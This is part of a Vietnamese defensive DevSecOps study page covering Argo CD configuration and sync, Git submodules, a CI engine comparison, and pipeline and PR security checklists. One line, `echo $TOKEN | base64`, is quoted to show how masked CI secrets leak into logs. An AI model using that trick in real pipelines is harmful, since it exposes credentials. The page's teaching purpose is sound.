+    # helm: { valueFiles: [values-prod.yaml] }   # nếu Helm
+  destination:
+    server: https://kubernetes.default.svc       # cluster đích
+    namespace: my-app
+  syncPolicy:
+    automated:
+      prune: true                 # xóa resource không còn trong Git
+      selfHeal: true              # ghi đè drift thủ công
+      allowEmpty: false
+    syncOptions:
+      - CreateNamespace=true
+      - ServerSideApply=true
+    retry:
+      limit: 5
+      backoff: { duration: 5s, factor: 2, maxDuration: 3m }
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Ý nghĩa</th>
+<th>Ghi chú bảo mật</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>spec.project</code></td>
+<td>AppProject (RBAC, ranh giới)</td>
+<td><code>default</code> cho phép mọi repo/cluster — nên tạo project riêng giới hạn <code>sourceRepos</code>, <code>destinations</code></td>
+</tr>
+<tr>
+<td><code>source.repoURL</code></td>
+<td>Repo nguồn</td>
+<td>Phải nằm trong whitelist của AppProject</td>
+</tr>
+<tr>
+<td><code>targetRevision</code></td>
+<td>Phiên bản theo dõi</td>
+<td><code>HEAD</code>/branch = theo dõi liên tục; pin SHA = bất biến</td>
+</tr>
+<tr>
+<td><code>destination.server</code></td>
+<td>Cluster đích</td>
+<td>Giới hạn trong AppProject</td>
+</tr>
+<tr>
+<td><code>syncPolicy.automated.prune</code></td>
+<td>Xóa resource thừa</td>
+<td>Bật cẩn thận — có thể xóa nhầm</td>
+</tr>
+<tr>
+<td><code>selfHeal</code></td>
+<td>Tự sửa drift</td>
+<td>Ngăn thay đổi <code>kubectl edit</code> thủ công tồn tại</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch07-754-sync-manual-auto-sync-self-heal-khac-biet">7.5.4. Sync: manual, auto-sync, self-heal — khác biệt</h3>
+<ul>
+<li><strong>Manual sync:</strong> thấy OutOfSync nhưng <strong>không</strong> tự apply; người vận hành bấm "Sync".</li>
+<li><strong>Auto-sync (<code>automated</code>):</strong> commit mới vào Git → tự apply trong vòng reconcile kế tiếp.</li>
+<li><strong>Self-heal:</strong> khi ai đó <code>kubectl edit</code> resource (drift), Argo phát hiện live ≠ desired và <strong>ghi đè về Git</strong>. Đây là cơ chế phòng thủ chống thay đổi trái phép ở cluster: kẻ tấn công sửa Deployment để chèn sidecar độc hại → Argo tự revert trong vài phút.</li>
+</ul>
+<h3 id="ch07-755-app-of-apps-pattern">7.5.5. App of Apps pattern</h3>
+<p>Một Application "root" trỏ tới thư mục chứa các manifest <strong>Application khác</strong>. Argo sync root → tạo các child App → mỗi child sync workload thật. Dùng để bootstrap toàn bộ cluster từ một Git repo.</p>
+<pre><code class="language-yaml"># root-app.yaml — quản lý các Application con
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata: { name: root, namespace: argocd }
+spec:
+  project: default
+  source:
+    repoURL: https://github.com/my-org/gitops.git
+    targetRevision: main
+    path: bootstrap/apps          # thư mục chứa nhiều Application YAML
+  destination: { server: https://kubernetes.default.svc, namespace: argocd }
+  syncPolicy: { automated: { prune: true, selfHeal: true } }
+</code></pre>
+<p><strong>Bảo mật:</strong> ai sửa được <code>bootstrap/apps</code> kiểm soát toàn bộ cluster. Repo GitOps phải có branch protection + required reviews nghiêm ngặt — nó tương đương quyền cluster-admin.</p>
+<h3 id="ch07-756-luu-y-bao-mat-argo-cd">7.5.6. Lưu ý bảo mật Argo CD</h3>
+<ul>
+<li>Argo CD chạy với quyền cao trong cluster (thường cluster-admin nếu quản nhiều namespace). Compromise Argo = compromise cluster.</li>
+<li>Khóa AppProject: giới hạn <code>sourceRepos</code>, <code>destinations</code>, <code>clusterResourceWhitelist</code>.</li>
+<li>Bảo vệ repo GitOps như production: signed commits, branch protection.</li>
+<li>Đổi mật khẩu <code>admin</code> mặc định (ban đầu = tên pod argocd-server), bật SSO/RBAC.</li>
+<li>Webhook nhận từ Git để sync ngay: xác thực webhook secret để tránh giả mạo trigger.</li>
+</ul>
+<hr />
+<h2 id="ch07-76-git-submodule-chia-se-template-chung">7.6. Git Submodule (chia sẻ template chung)</h2>
+<h3 id="ch07-761-la-gi-va-cau-truc-tren-đia">7.6.1. Là gì và cấu trúc trên đĩa</h3>
+<p>Submodule cho phép nhúng một repo Git (con) tại một đường dẫn trong repo cha, <strong>pin theo một commit cụ thể</strong>. Hai thành phần:</p>
+<ol>
+<li><strong><code>.gitmodules</code></strong> — file text ở gốc repo cha, ánh xạ path → URL:</li>
+</ol>
+<pre><code class="language-ini">[submodule &quot;ci-templates&quot;]
+    path = ci-templates
+    url = https://github.com/my-org/ci-templates.git
+    branch = main
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Trường</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>path</code></td>
+<td>Thư mục đặt submodule trong cha</td>
+<td><code>ci-templates</code></td>
+</tr>
+<tr>
+<td><code>url</code></td>
+<td>Nguồn clone</td>
+<td><code>https://.../ci-templates.git</code></td>
+</tr>
+<tr>
+<td><code>branch</code></td>
+<td>Branch theo dõi khi <code>--remote</code></td>
+<td><code>main</code> (tùy chọn)</td>
+</tr>
+</tbody>
+</table>
+<ol start="2">
+<li><strong>gitlink</strong> — entry trong tree của repo cha tại <code>path</code>, không phải blob/tree thường mà là một con trỏ <strong>commit SHA</strong> (mode <code>160000</code>). Đây là cơ chế "pinning".</li>
+</ol>
+<p>Xem bằng <code>git ls-tree</code>:</p>
+<pre><code>$ git ls-tree HEAD ci-templates
+160000 commit 9b2c4f1a8d3e0c5b7f2a1d6e4c8b0a3f9d2e1c7b  ci-templates
+</code></pre>
+<p><code>160000</code> là mode đặc biệt cho gitlink; theo sau là SHA commit (40 hex = 160 bit) của repo con được pin. Repo cha <strong>không</strong> lưu nội dung repo con, chỉ lưu con trỏ commit này.</p>
+<h3 id="ch07-762-lenh-va-luong-tung-buoc">7.6.2. Lệnh và luồng (từng bước)</h3>
+<pre><code class="language-bash"># Thêm submodule
+git submodule add https://github.com/my-org/ci-templates.git ci-templates
+#  → tạo/cập nhật .gitmodules, clone repo con vào ci-templates/, stage gitlink
+
+# Clone repo cha có submodule (submodule rỗng mặc định)
+git clone https://github.com/my-org/app.git
+git submodule init        # đọc .gitmodules → đăng ký vào .git/config
+git submodule update      # clone/checkout submodule tại đúng commit pinned
+# hoặc gộp:
+git clone --recurse-submodules https://github.com/my-org/app.git
+
+# Cập nhật submodule lên commit mới của branch theo dõi
+git submodule update --remote ci-templates
+git add ci-templates       # stage gitlink mới (con trỏ SHA mới)
+git commit -m &quot;Bump ci-templates&quot;
+</code></pre>
+<p><strong>Luồng <code>git submodule update</code> từng bước:</strong></p>
+<pre><code>1. Đọc .git/config (path → url đã init)
+2. Với mỗi submodule: đọc gitlink SHA từ index của cha
+3. Vào thư mục con, fetch nếu thiếu commit đó
+4. checkout chính xác commit SHA (detached HEAD) — KHÔNG theo branch
+</code></pre>
+<p>Mặc định submodule ở trạng thái <strong>detached HEAD</strong> tại đúng SHA pinned — đây là điểm hay gây nhầm lẫn: pull repo cha không tự cập nhật submodule trừ khi chạy <code>git submodule update</code>.</p>
+<h3 id="ch07-763-vi-sao-dung-cho-template-chung-nhuoc-điem">7.6.3. Vì sao dùng cho template chung &amp; nhược điểm</h3>
+<p><strong>Vì sao dùng:</strong> nhiều project (vd nhiều microservice) chia sẻ chung bộ template CI/CD, policy, script bảo mật. Đặt template vào một repo con, nhúng làm submodule:
+- Mỗi project pin chính xác phiên bản template đã review (gitlink SHA) → <strong>reproducible</strong>, không bị template thay đổi đột ngột phá build.
+- Nâng cấp template là một commit có chủ đích (đổi gitlink) → đi qua code review.</p>
+<p><strong>Nhược điểm / cạm bẫy:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Nhược điểm</th>
+<th>Chi tiết</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Detached HEAD gây nhầm</td>
+<td>Sửa trong submodule dễ mất nếu không commit/push đúng repo con</td>
+</tr>
+<tr>
+<td>Hai bước cập nhật</td>
+<td>Phải update submodule <strong>và</strong> commit gitlink ở cha — quên một bước = drift</td>
+</tr>
+<tr>
+<td>Clone phức tạp</td>
+<td>Người mới quên <code>--recurse-submodules</code> → thiếu file → build fail</td>
+</tr>
+<tr>
+<td>Không atomic</td>
+<td>Đổi repo con và repo cha là hai commit tách rời</td>
+</tr>
+</tbody>
+</table>
+<p><strong>So với lựa chọn khác:</strong> Git <strong>subtree</strong> (gộp lịch sử repo con vào cha, không cần lệnh đặc biệt khi clone) hoặc package manager nội bộ (npm/pip private registry) hoặc cơ chế <code>include</code> của CI (GitLab <code>include: project:</code>). Với template CI, <code>include</code> từ một project trung tâm thường gọn hơn submodule.</p>
+<h3 id="ch07-764-luu-y-bao-mat-submodule">7.6.4. Lưu ý bảo mật submodule</h3>
+<ul>
+<li><strong><code>url</code> trỏ tới repo do bên ngoài kiểm soát:</strong> nếu attacker chiếm repo con, mọi cha kéo commit mới sẽ chạy code độc — nhưng vì pin theo SHA, chỉ bị ảnh hưởng khi ai đó chủ động bump. Pin SHA + review diff submodule.</li>
+<li><strong><code>.gitmodules</code> injection (CVE lịch sử):</strong> từng có lỗ hổng khi tên/path submodule chứa ký tự đặc biệt dẫn tới ghi file ngoài thư mục hoặc thực thi hook. Cập nhật Git mới; coi <code>.gitmodules</code> từ nguồn không tin cậy là dữ liệu nguy hiểm.</li>
+<li>Trong CI, <code>--recurse-submodules</code> kéo code bên thứ ba vào build — đối xử như dependency: scan, pin, kiểm soát URL.</li>
+</ul>
+<hr />
+<h2 id="ch07-77-so-sanh-va-khi-nao-dung-cong-cu-nao">7.7. So sánh và khi nào dùng công cụ nào</h2>
+<h3 id="ch07-771-bang-so-sanh-cicd-engine">7.7.1. Bảng so sánh CI/CD engine</h3>
+<table>
+<thead>
+<tr>
+<th>Tiêu chí</th>
+<th>GitLab CI</th>
+<th>GitHub Actions</th>
+<th>Jenkins</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cấu hình</td>
+<td><code>.gitlab-ci.yml</code> (YAML)</td>
+<td><code>.github/workflows/*.yml</code> (YAML)</td>
+<td><code>Jenkinsfile</code> (Groovy)</td>
+</tr>
+<tr>
+<td>Tích hợp SCM</td>
+<td>GitLab native</td>
+<td>GitHub native</td>
+<td>SCM-agnostic (plugin)</td>
+</tr>
+<tr>
+<td>Hosting</td>
+<td>SaaS + self-managed</td>
+<td>SaaS + self-hosted runner</td>
+<td>Self-hosted</td>
+</tr>
+<tr>
+<td>Mô hình runner</td>
+<td>Runner + executor</td>
+<td>Runner (hosted/self)</td>
+<td>Controller + agent</td>
+</tr>
+<tr>
+<td>Hệ sinh thái tái dùng</td>
+<td><code>include</code> templates, CI components</td>
+<td>Marketplace actions</td>
+<td>Plugin (rất lớn, rủi ro)</td>
+</tr>
+<tr>
+<td>Secrets</td>
+<td>CI/CD variables (masked/protected)</td>
+<td>Secrets + OIDC</td>
+<td>Credentials store</td>
+</tr>
+<tr>
+<td>Điểm mạnh</td>
+<td>All-in-one DevSecOps (SAST/DAST tích hợp)</td>
+<td>Hệ sinh thái action, OIDC mượt</td>
+<td>Cực kỳ linh hoạt, on-prem lâu đời</td>
+</tr>
+<tr>
+<td>Điểm yếu bảo mật</td>
+<td>Runner privileged/shared</td>
+<td><code>pull_request_target</code>, script injection</td>
+<td>Plugin CVE, Groovy sandbox bypass</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch07-772-cicd-push-vs-gitops-argo-cd-khi-nao-dung">7.7.2. CI/CD push vs GitOps (Argo CD) — khi nào dùng</h3>
+<table>
+<thead>
+<tr>
+<th>Tình huống</th>
+<th>Lựa chọn</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Build/test/đóng gói artifact</td>
+<td>CI engine (GitLab CI / Actions / Jenkins)</td>
+</tr>
+<tr>
+<td>Triển khai vào Kubernetes, cần drift detection + audit qua Git</td>
+<td>GitOps (Argo CD)</td>
+</tr>
+<tr>
+<td>Triển khai non-K8s (VM, serverless, mobile)</td>
+<td>CI-push (Actions/GitLab/Jenkins)</td>
+</tr>
+<tr>
+<td>Cần credential cluster không rời cluster</td>
+<td>GitOps</td>
+</tr>
+<tr>
+<td>Mô hình lý tưởng hiện đại</td>
+<td>CI build &amp; push image → cập nhật manifest trong repo GitOps → Argo CD reconcile lên cluster</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Mẫu kiến trúc kết hợp (khuyến nghị):</strong></p>
+<pre><code>[Code repo] --CI build/test/scan--&gt; [Container Registry] (image @sha256:...)
+     │
+     └─ CI cập nhật tag image trong [GitOps repo] (commit)
+                              │
+                  Argo CD reconcile (pull)
+                              ▼
+                       [Kubernetes cluster]
+</code></pre>
+<p>Tách bạch: CI lo build &amp; verify (không có quyền cluster), Argo lo deploy (không cần credential ra ngoài). Đây là phân tách trách nhiệm (SoD) tốt nhất cho DevSecOps.</p>
+<h3 id="ch07-773-checklist-bao-mat-xuyen-suot-chuong">7.7.3. Checklist bảo mật xuyên suốt chương</h3>
+<ul>
+<li>Pin mọi thành phần bên thứ ba theo immutable digest/SHA (action, image <code>@sha256</code>, submodule gitlink).</li>
+<li>Least privilege token: GitLab <code>CI_JOB_TOKEN</code> scope hẹp, GHA <code>permissions</code> tối thiểu, OIDC <code>sub</code> pin chặt, Argo AppProject giới hạn repo/cluster.</li>
+<li>Branch protection + required review cho mọi repo chứa pipeline-as-code và GitOps manifest (chúng = thực thi mã đặc quyền).</li>
+<li>Cách ly runner/agent: không privileged, không docker.sock shared, ephemeral, không build trên controller.</li>
+<li>Secret hygiene: masked không phải kiểm soát đủ; không log secret, không nội suy secret vào lệnh shell qua interpolation engine.</li>
+<li>Phát hiện drift &amp; self-heal (Argo) như một lớp phòng thủ chống thay đổi cluster trái phép.</li>
+<li>Quét SAST/SCA/secret-scan trong pipeline; chặn merge khi có finding nghiêm trọng.</li>
+</ul>
+<hr />
+<h2 id="ch07-78-bao-ve-pipeline-nhu-mot-he-thong-production-tieu-chuan-bao-mat-cho-pr">7.8. Bảo vệ pipeline như một hệ thống production &amp; tiêu chuẩn bảo mật cho PR</h2>
+<h3 id="ch07-781-pipeline-la-tai-san-can-bao-ve-khong-chi-la-cong-cu">7.8.1. Pipeline là tài sản cần bảo vệ, không chỉ là công cụ</h3>
+<p>OWASP Top 10 2025 xếp "pipeline CI/CD bị chèn mã" vào nhóm <strong>A08 — Software &amp; Data Integrity Failures</strong>: cập nhật không ký số, build bị can thiệp, deserialize dữ liệu không tin cậy. Với một công ty làm phần mềm cho khách hàng, hệ quả cụ thể hơn nhiều so với lý thuyết: <strong>pipeline bị chiếm nghĩa là kẻ tấn công chèn mã vào đúng bản build giao cho khách</strong> — mình trở thành mắt xích supply chain của họ, lỗ hổng của mình thành lỗ hổng của họ. Vì vậy pipeline phải được đối xử như hệ thống production, với checklist tối thiểu:</p>
+<ul>
+<li><strong>Secret trong CI để ở vault / secret manager, không in ra log.</strong> Tiêm secret lúc chạy job (OIDC/workload identity nếu được — xem 7.3.4 và <a href="ch06.html">Chương 6</a> mục 6.11), không gán cứng vào file pipeline hay biến plaintext. Nhớ rằng masking chỉ che log ở dạng nguyên văn (7.2.5) — một dòng <code>echo $TOKEN | base64</code> là lộ; quy tắc gốc vẫn là <em>không đưa secret ra stdout dưới bất kỳ dạng nào</em>.</li>
+<li><strong>Ký số + verify artifact.</strong> Bản build/image phải được ký (cosign — <a href="ch06.html">Chương 6</a> mục 6.10.4) và verify trước khi deploy; verify checksum và nguồn gốc của dependency kéo vào lúc build. Không có chữ ký thì "artifact đi qua stage được thăng cấp tin cậy" (7.1.2) chỉ là niềm tin suông.</li>
+<li><strong>Khóa quyền pipeline.</strong> Ai sửa được file pipeline là thực thi được mã với đặc quyền của pipeline (7.1.3) — nên repo chứa pipeline-as-code cần branch protection + required review; token của job theo least privilege (7.7.3); quyền chỉnh sửa cấu hình CI/CD (variables, runner) giới hạn cho số ít người và có audit log.</li>
+</ul>
+<h3 id="ch07-782-pr-security-checklist-definition-of-done-bao-mat">7.8.2. PR security checklist &amp; Definition of Done bảo mật</h3>
+<p>Gate tự động (SAST/SCA/secret scan — <a href="ch06.html">Chương 6</a>) bắt lỗi generic, nhưng lỗi logic nghiệp vụ (thiếu check quyền, luồng tiền không idempotent) chỉ con người bắt được. Công cụ ở đây là <strong>PR security checklist</strong> — danh sách reviewer đối chiếu trước khi approve. Bản mình dùng ở hệ thống mình vận hành (một backend Node/TypeScript có xử lý thanh toán và dữ liệu cá nhân):</p>
+<ul>
+<li>[ ] Mọi truy vấn tài nguyên ràng buộc chủ sở hữu lấy từ token — không tin id client gửi lên (chống IDOR).</li>
+<li>[ ] Không nối chuỗi SQL; dùng parameterized query / ORM.</li>
+<li>[ ] Input được validate (allowlist); output được encode đúng ngữ cảnh.</li>
+<li>[ ] Không hardcode secret; dùng secret manager; <code>.env</code> không lên repo.</li>
+<li>[ ] Endpoint mới có kiểm auth + phân quyền ở server.</li>
+<li>[ ] Thao tác liên quan tiền: atomic + idempotent, có kiểm số dư/điều kiện.</li>
+<li>[ ] Không log dữ liệu nhạy cảm (token, mật khẩu, số thẻ, định danh cá nhân).</li>
+<li>[ ] Lỗi xử lý fail-secure (mặc định từ chối); không lộ stack trace cho user.</li>
+<li>[ ] Nếu gọi LLM: tách role system/user; không cho gọi API nhạy cảm tự do; thao tác đổi trạng thái phải có xác nhận.</li>
+<li>[ ] Dependency mới đã được quét, không CVE nghiêm trọng.</li>
+</ul>
+<p>Nguyên tắc thiết kế checklist: <strong>phải đủ ngắn để dev thực sự đọc</strong> — checklist 30 mục là checklist không ai đọc. Mỗi mục phải kiểm được bằng mắt trên diff, không phải mục "hãy bảo mật tốt".</p>
+<p>Bổ sung cho checklist là <strong>Definition of Done có bảo mật</strong> — một tính năng chỉ "done" khi:</p>
+<ol>
+<li>Đã viết ít nhất một abuse case ("kẻ xấu lạm dụng tính năng này thế nào?") và xử lý nó.</li>
+<li>Qua SAST + secret scan trong CI, không còn lỗi Critical/High.</li>
+<li>Luồng nhạy cảm (auth / payment / dữ liệu cá nhân) có human review — không phụ thuộc hoàn toàn scanner hay AI review.</li>
+<li>Có log sự kiện bảo mật cần thiết, và log không lộ dữ liệu nhạy cảm.</li>
+</ol>
+<p>Điểm khác biệt so với DoD thường: "chạy được" chưa đủ — phải "chạy được và không mở lỗ hổng mới". Đưa tiêu chí bảo mật vào DoD nghĩa là bảo mật nằm trong định nghĩa hoàn thành từ đầu, rẻ và tự nhiên hơn nhiều so với kiểm sau khi xong.</p>
+<hr />
+<h2 id="ch07-ghi-chu-cua-minh">Ghi chú của mình</h2>
+<blockquote>
+<p><em>Khu vực ghi chú cá nhân: những điểm từng hiểu sai, phần còn đang tìm hiểu, hoặc kinh nghiệm rút ra khi thực hành — cập nhật dần.</em></p>
+</blockquote>
+<ul>
+<li>Là người làm bảo mật duy nhất ở công ty nhỏ, mình học được rằng pipeline chính là "người gác cổng thay mình": gate và scan chạy tự động không cần mình online, và đó là điều kiện để hệ thống vẫn "an toàn mặc định" khi người duy nhất nghỉ phép. Nếu quy trình bảo mật nào cũng cần mình bấm nút thì mình là single point of failure — automation trong chương này (gate, protected branch, OIDC thay secret tĩnh) là cách gỡ điểm nghẽn đó.</li>
+<li>Điều từng hiểu sai: nghĩ masked variable là "đã an toàn". Thực tế masking chỉ che log dạng nguyên văn — job in secret qua một phép biến đổi là lộ, và MR độc hại trên nhánh không protected vẫn đọc được biến nếu quên set protected cả hai phía (biến VÀ branch). Từ đó mình coi cặp cấu hình protected variable + protected branch là thứ phải kiểm tra cùng nhau, không tách rời.</li>
+<li>Bài học về gate ở tầng PR: gate quá gắt thì dev bypass — không phải vì họ vô trách nhiệm, mà vì deadline là thật. Giải pháp không phải nới gate mà là có <strong>đường exception chính thức</strong> (approve + ticket + audit, xem <a href="ch06.html">Chương 6</a> mục 6.9.4); khi có đường đi đàng hoàng lúc gấp, người ta không đục tường nữa. Và checklist PR mình cố tình giữ ngắn — thà 10 mục được đọc thật còn hơn 30 mục bị approve theo quán tính.</li>
+<li>Đang tìm hiểu tiếp: GitOps/Argo CD mình mới nắm ở mức khái niệm và lab, chưa vận hành thật (hệ thống hiện tại deploy theo mô hình CI-push truyền thống lên VM); thứ mình muốn thử trước là tách quyền deploy khỏi CI theo đúng tinh thần 7.7.2, kể cả khi chưa có Kubernetes.</li>
+</ul>
+</section>
+      <nav class="pager"><a class="pg prev" href="ch06.html"><span>← Chương trước</span><b>06 · DevSecOps &amp; Quét mã nguồn</b></a><a class="pg next" href="ch08.html"><span>Chương sau →</span><b>08 · SIEM &amp; Quản lý log</b></a></nav>
+    </main>
+    <footer class="site-foot">
+      <p>Ghi chép & chia sẻ bởi <span class="name">Fee</span> · tự do cho mục đích học tập.
+      &nbsp;·&nbsp; <a href="https://github.com/fee-191" target="_blank" rel="noopener">GitHub</a>
+      &nbsp;·&nbsp; <a href="https://linkedin.com/in/leduongphi191" target="_blank" rel="noopener">LinkedIn</a></p>
+      <p>Nội dung mang tính giáo dục, nhằm mục đích phòng thủ. Hãy thực hành hợp pháp, chỉ trên hệ thống bạn được phép.</p>
+    </footer>
+  </div>
+</div>
+<script>
+const root=document.documentElement;
+const THEMES=['light','dark','wibu'];
+const ICON={light:'☀️',dark:'🌙',wibu:'🌸'};
+function curTheme(){return root.getAttribute('data-theme')||'light';}
+function syncTheme(){const c=curTheme();document.querySelectorAll('.themeBtn').forEach(b=>b.textContent=ICON[c]||'☀️');}
+function setTheme(t){if(t==='light')root.removeAttribute('data-theme');else root.setAttribute('data-theme',t);localStorage.setItem('kb-theme',t);syncTheme();}
+syncTheme();
+document.querySelectorAll('.themeBtn').forEach(b=>b.addEventListener('click',()=>{
+  const i=THEMES.indexOf(curTheme());setTheme(THEMES[(i+1)%THEMES.length]);
+}));
+const navChapters=[...document.querySelectorAll('.nav-chapter')];
+document.querySelectorAll('.nav-sub, .nav-ch-title').forEach(a=>a.addEventListener('click',()=>{if(window.innerWidth<=980)document.querySelector('.sidebar').classList.remove('show');}));
+// Đánh dấu mục con đang đọc trong chương hiện tại
+const cur=document.querySelector('.nav-chapter.active');
+if(cur){
+  const heads=[...document.querySelectorAll('.chapter h2[id]')];
+  const links=new Map([...cur.querySelectorAll('.nav-sub')].map(a=>[a.getAttribute('href').slice(1),a]));
+  const obs=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){
+    links.forEach(a=>a.classList.remove('here'));
+    const a=links.get(e.target.id); if(a){a.classList.add('here');a.scrollIntoView({block:'nearest'});}
+  }});},{rootMargin:'-10% 0px -80% 0px',threshold:0});
+  heads.forEach(h=>obs.observe(h));
+}
+const box=document.getElementById('q');
+if(box)box.addEventListener('input',()=>{const q=box.value.trim().toLowerCase();
+  navChapters.forEach(c=>{const title=c.querySelector('.nav-ch-title').innerText.toLowerCase();
+    const subs=[...c.querySelectorAll('.nav-sub')];let any=title.includes(q);
+    subs.forEach(s=>{const m=s.innerText.toLowerCase().includes(q);s.style.display=(!q||m)?'block':'none';if(m)any=true;});
+    c.style.display=(!q||any)?'block':'none';});
+});
+const mb=document.getElementById('menu');if(mb)mb.addEventListener('click',()=>document.querySelector('.sidebar').classList.toggle('show'));
+// ←/→ chuyển chương
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='INPUT'||e.metaKey||e.ctrlKey||e.altKey)return;
+  const p=document.querySelector('link[rel=prev]'),n=document.querySelector('link[rel=next]');
+  if(e.key==='ArrowLeft'&&p)location.href=p.href;
+  if(e.key==='ArrowRight'&&n)location.href=n.href;
+});
+</script>
+</body>
+</html>
